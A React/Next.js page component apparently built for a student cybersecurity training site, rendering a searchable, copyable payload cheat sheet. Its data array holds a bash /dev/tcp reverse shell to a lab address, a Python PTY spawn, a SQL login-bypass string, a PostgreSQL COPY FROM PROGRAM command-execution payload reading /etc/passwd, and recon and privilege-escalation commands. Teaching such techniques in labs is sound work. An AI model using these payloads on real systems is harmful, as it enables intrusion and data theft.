'use client';

import { useState } from 'react';
import Link from 'next/link';
import { CyberSmokeHeader } from "@/components/CyberSmokeHeader";
import { StudentAIAssistant } from "@/components/StudentAIAssistant";
import { 
  ArrowLeft, 
  Copy, 
  Check, 
  Terminal, 
  ShieldAlert, 
  Cpu, 
  Search, 
  Code2, 
  Database,
  Lock,
  Layers
} from "lucide-react";

interface PayloadItem {
  id: string;
  category: 'Reverse Shell' | 'SQLi' | 'PrivEsc' | 'Recon' | 'Forensics';
  title: string;
  description: string;
  code: string;
}

const CHEATSHEET_DATA: PayloadItem[] = [
  {
    id: 'p1',
    category: 'Reverse Shell',
    title: 'Bash TCP One-Liner',
    description: 'Standard Linux interactive reverse TCP payload for Netcat listener.',
    code: 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1',
  },
  {
    id: 'p2',
    category: 'Reverse Shell',
    title: 'Python 3 Interactive PTY',
    description: 'Spawns a clean pseudoterminal shell for stabilization.',
    code: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
  },
  {
    id: 'p3',
    category: 'SQLi',
    title: 'Universal Auth Bypass Payload',
    description: 'Bypasses standard single-quote SQL login authentication checks.',
    code: "' OR 1=1 -- -",
  },
  {
    id: 'p4',
    category: 'SQLi',
    title: 'PostgreSQL Command Execution',
    description: 'Stacked query RCE payload using COPY PROGRAM command.',
    code: "'; COPY users FROM PROGRAM 'cat /etc/passwd'; --",
  },
  {
    id: 'p5',
    category: 'PrivEsc',
    title: 'SUID Binaries Enumeration',
    description: 'Lists all system files with SUID bit set without stderr clutter.',
    code: 'find / -perm -u=s -type f 2>/dev/null',
  },
  {
    id: 'p6',
    category: 'PrivEsc',
    title: 'Sudo Privileges Inspection',
    description: 'Checks what commands the current operative user can run as root.',
    code: 'sudo -l',
  },
  {
    id: 'p7',
    category: 'Recon',
    title: 'Nmap Full TCP Port Sweep with Scripts',
    description: 'Scans all 65535 ports with service version detection and default NSE scripts.',
    code: 'nmap -p- -sV -sC -T4 -oN nmap_full.txt 10.10.14.88',
  },
  {
    id: 'p8',
    category: 'Forensics',
    title: 'Volatility 3 Process Tree Dump',
    description: 'Extracts memory image parent-child process relationship hierarchy.',
    code: 'vol -f memory.raw windows.pstree',
  },
  {
    id: 'p9',
    category: 'Forensics',
    title: 'Volatility 3 Injected Code Hunter',
    description: 'Scans memory pages for unmapped executable code and injected DLLs.',
    code: 'vol -f memory.raw windows.malfind',
  },
];

export default function CheatSheetPage() {
  const [selectedCat, setSelectedCat] = useState<string>('All');
  const [search, setSearch] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);

  const handleCopy = (id: string, text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const filteredPayloads = CHEATSHEET_DATA.filter((item) => {
    const matchesCat = selectedCat === 'All' || item.category === selectedCat;
    const matchesSearch = item.title.toLowerCase().includes(search.toLowerCase()) ||
                          item.description.toLowerCase().includes(search.toLowerCase()) ||
                          item.code.toLowerCase().includes(search.toLowerCase());
    return matchesCat && matchesSearch;
  });

  return (
    <main className="min-h-screen bg-zinc-950 text-zinc-100 font-mono pb-16">
      <CyberSmokeHeader />

      <div className="max-w-6xl mx-auto p-4 md:p-8 space-y-8">
        
        {/* Navigation */}
        <div className="flex flex-wrap items-center justify-between gap-4 border-b border-zinc-800/80 pb-4">
          <Link
            href="/"
            className="flex items-center space-x-2 text-xs text-cyan-400 hover:text-cyan-300 transition group"
          >
            <ArrowLeft className="w-4 h-4 transform group-hover:-translate-x-1 transition" />
            <span>← RETURN TO DASHBOARD</span>
          </Link>
          <div className="text-xs text-zinc-500 font-bold">
            TACTICAL PAYLOAD ARSENAL // QUICK INJECTION MATRIX
          </div>
        </div>

        {/* Filters & Search */}
        <div className="flex flex-col md:flex-row items-center justify-between gap-4">
          <div className="flex items-center gap-2 overflow-x-auto w-full md:w-auto pb-2 md:pb-0 no-scrollbar">
            {['All', 'Reverse Shell', 'SQLi', 'PrivEsc', 'Recon', 'Forensics'].map((cat) => (
              <button
                key={cat}
                onClick={() => setSelectedCat(cat)}
                className={`px-3 py-1.5 rounded-xl text-xs font-bold transition whitespace-nowrap cursor-pointer ${
                  selectedCat === cat
                    ? 'bg-cyan-500 text-zinc-950 shadow-[0_0_15px_rgba(6,182,212,0.4)]'
                    : 'bg-zinc-900/80 border border-zinc-800 text-zinc-400 hover:text-zinc-200'
                }`}
              >
                {cat.toUpperCase()}
              </button>
            ))}
          </div>

          <div className="relative w-full md:w-72">
            <Search className="w-4 h-4 text-zinc-500 absolute left-3 top-1/2 -translate-y-1/2" />
            <input
              type="text"
              value={search}
              onChange={(e) => setSearch(e.target.value)}
              placeholder="Search payloads & exploits..."
              className="w-full pl-9 pr-4 py-2 rounded-xl bg-zinc-900/80 border border-zinc-800 text-xs text-zinc-100 placeholder-zinc-500 focus:outline-none focus:border-cyan-500 transition"
            />
          </div>
        </div>

        {/* Payloads Grid */}
        <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
          {filteredPayloads.map((payload) => (
            <div
              key={payload.id}
              className="p-5 rounded-2xl bg-zinc-900/70 border border-cyan-500/20 hover:border-cyan-500/40 backdrop-blur-md transition flex flex-col justify-between space-y-4 shadow-[0_0_20px_rgba(0,0,0,0.3)]"
            >
              <div className="space-y-2">
                <div className="flex items-center justify-between">
                  <span className="text-[9px] px-2 py-0.5 rounded bg-cyan-500/10 border border-cyan-500/30 text-cyan-400 font-bold uppercase">
                    {payload.category}
                  </span>
                </div>
                <h3 className="text-sm font-bold text-zinc-100">{payload.title}</h3>
                <p className="text-xs text-zinc-400 leading-relaxed">{payload.description}</p>
              </div>

              {/* Code Box */}
              <div className="relative group">
                <pre className="p-3 rounded-xl bg-zinc-950 border border-zinc-800 text-xs text-cyan-300 overflow-x-auto whitespace-pre-wrap font-mono select-all">
                  {payload.code}
                </pre>
                <button
                  onClick={() => handleCopy(payload.id, payload.code)}
                  className="absolute right-2 top-2 p-1.5 rounded-lg bg-zinc-800/90 border border-zinc-700 text-zinc-300 hover:text-cyan-400 transition cursor-pointer"
                  title="Copy payload"
                >
                  {copiedId === payload.id ? (
                    <Check className="w-3.5 h-3.5 text-green-400" />
                  ) : (
                    <Copy className="w-3.5 h-3.5" />
                  )}
                </button>
              </div>
            </div>
          ))}
        </div>
      </div>

      <StudentAIAssistant />
    </main>
  );
}
